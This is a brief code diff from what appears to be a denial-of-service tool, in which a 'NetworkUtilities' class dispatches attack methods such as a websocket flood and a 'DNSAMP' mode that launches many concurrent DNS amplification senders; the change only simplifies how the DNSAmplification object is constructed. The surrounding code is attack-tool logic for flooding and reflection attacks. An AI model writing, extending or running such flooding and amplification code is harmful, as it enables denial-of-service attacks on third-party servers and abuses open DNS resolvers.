@@ -336,9 +336,7 @@ class NetworkUtilities:
                     await ws_flood.wait_done()
 
             elif method == "DNSAMP":
-                dns_amp = DNSAmplification(
-                    endpoint.host, endpoint.port, duration=duration
-                )
+                dns_amp = DNSAmplification(endpoint, duration=duration)
                 tasks = []
                 for _ in range(threads):
                     tasks.append(asyncio.create_task(dns_amp._send_dns_amp()))
